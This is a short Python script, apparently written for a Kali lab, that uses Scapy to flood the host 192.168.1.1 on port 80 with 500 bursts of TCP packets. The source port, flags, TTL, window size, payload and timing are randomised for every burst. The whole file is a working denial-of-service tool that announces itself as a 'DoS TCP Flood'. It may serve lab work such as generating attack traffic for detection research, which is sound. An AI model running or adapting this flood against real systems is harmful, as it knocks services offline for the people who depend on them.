from scapy.all import *
import random
import time

TARGET_IP = "192.168.1.1"
TARGET_PORT = 80
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting DoS TCP Flood -> {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    sport   = random.randint(1024, 65535)
    ttl     = random.randint(32, 128)
    window  = random.choice([1024, 2048, 4096, 8192, 16384, 65535])
    seq     = random.randint(0, 2**32 - 1)
    ack_num = random.randint(0, 2**32 - 1)
    packets = random.randint(MIN_PACKETS, MAX_PACKETS)

    flag    = random.choice(["S", "A", "F", "R", "PA", "SA", "FA", "RA"])

    size_min = random.randint(0, 100)
    size_max = random.randint(size_min + 50, 1400)

    iat_min  = random.uniform(0.0001, 0.005)
    iat_max  = random.uniform(iat_min + 0.001, 0.05)

    for p in range(packets):
        payload_size = random.randint(size_min, size_max)
        payload      = bytes([random.randint(0, 255) for _ in range(payload_size)])

        pkt = IP(
            # NO src field — Scapy uses your real Kali IP automatically
            dst = TARGET_IP,
            ttl = ttl,
            id  = random.randint(1, 65535)
        ) / TCP(
            sport  = sport,
            dport  = TARGET_PORT,
            flags  = flag,
            seq    = seq + p,
            ack    = ack_num,
            window = window
        ) / Raw(load=payload)

        send(pkt, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")